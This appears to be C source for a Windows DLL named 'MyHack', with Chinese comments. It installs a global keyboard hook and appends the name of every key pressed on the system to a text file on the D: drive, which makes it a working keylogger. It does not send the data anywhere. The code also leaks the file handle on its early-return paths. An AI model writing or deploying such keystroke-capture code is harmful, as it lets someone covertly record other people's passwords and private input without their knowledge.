#include "MyHack.h"





int InstallHook()
{
	g_hook =  SetWindowsHookEx(WH_KEYBOARD, KeyboardProc,GetModuleHandle(L"MyHack"), 0); //3参数 模块 一个exe或dll可以叫做一个模块 
	if (g_hook == NULL)
		return 0;


	return 1;
}

int UnInstallHook()
{
	return UnhookWindowsHookEx(g_hook);//返回0 失败 返回1 成功
	//return 1;
}

//键盘钩子处理函数
long CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	

	
	
	 FILE* fp = fopen("D:\\keyboard_record.txt", "a");
	 if(nCode < 0 || nCode == HC_NOREMOVE )
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	//lPatam 是一个32位整数  30位是1表明已被按下 
	if(lParam & 0x40000000)
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	char key[100];

	GetKeyNameTextA(lParam,key,sizeof(key));
	fwrite(key, 1, strlen(key),fp);


	fclose(fp);

	return CallNextHookEx(g_hook, nCode, wParam, lParam);
	
	

}